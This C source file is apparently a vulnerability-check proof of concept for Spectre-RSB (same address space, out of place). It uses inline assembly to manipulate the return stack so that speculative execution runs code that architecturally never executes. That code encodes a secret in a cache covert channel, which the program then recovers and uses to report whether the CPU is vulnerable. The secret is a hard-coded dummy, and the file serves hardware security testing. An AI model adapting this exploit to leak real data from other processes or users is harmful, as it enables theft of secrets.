#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "libcache/cache.h"
#include "lib/global.h"

// inaccessible secret
#define SECRET "SECRETSS"

int idx;

// Pop return address from the software stack, causing misspeculation when hitting the return
int __attribute__((noinline)) call_manipulate_stack()
{
#if defined(__i386__) || defined(__x86_64__)
    asm volatile("pop %%rax\n"
                 :
                 :
                 : "rax");
#elif defined(__aarch64__)
    asm volatile("ldp x29, x30, [sp],#16\n"
                 :
                 :
                 : "x29");
#endif
    return 0;
}

int __attribute__((noinline)) call_leak()
{
    // Manipulate the stack so that we don't return here, but to call_start
    call_manipulate_stack();
    // architecturally, this is never executed
    // Encode data in covert channel
    cache_encode(SECRET[idx]);
    return 2;
}

int __attribute__((noinline)) call_start()
{
    call_leak();
    return 1;
}

void confuse_compiler()
{
    // this function -- although never called -- is required
    // otherwise, the compiler replaces the calls with jumps
    call_start();
    call_leak();
    call_manipulate_stack();
}

int main(int argc, char **argv)
{

    PREPARE();

    // flush our shared memory
    flush_shared_memory();
    // nothing leaked so far
    char leaked[sizeof(SECRET) + 1];
    memset(leaked, ' ', sizeof(leaked));
    leaked[sizeof(SECRET)] = 0;

    idx = 0;
    start_time = time(NULL);
    for (int i = 0; i < MAX_TRY_TIMES; i++)
    {
        // for every byte in the string
        idx = (idx + 1) % sizeof(SECRET);

        call_start();

        // Recover data from covert channel
        cache_decode_array(leaked, idx);

        sched_yield();
        if (time(NULL) - start_time > timeout)
        {
            printf(ANSI_COLOR_YELLOW "Spectre_RSB_sa_oop: Timeout" ANSI_COLOR_RESET "\n");
            exit(-1);
        }
    }
    for (int i = 0; i < sizeof(SECRET) - 1; i++)
    {
        if (SECRET[i] == leaked[i])
        {
            passed_count++;
        }
    }
    int exit_result = 0;
    if (passed_count > 0)
    {
        printf(ANSI_COLOR_RED "Spectre_RSB_sa_oop: Vulnerable" ANSI_COLOR_RESET "\n");
        exit_result = EXIT_SUCCESS;
    }
    else
    {
        printf(ANSI_COLOR_GREEN "Spectre_RSB_sa_oop: Not Vulnerable" ANSI_COLOR_RESET "\n");
        exit_result = EXIT_FAILURE;
    }
    exit(exit_result);
}
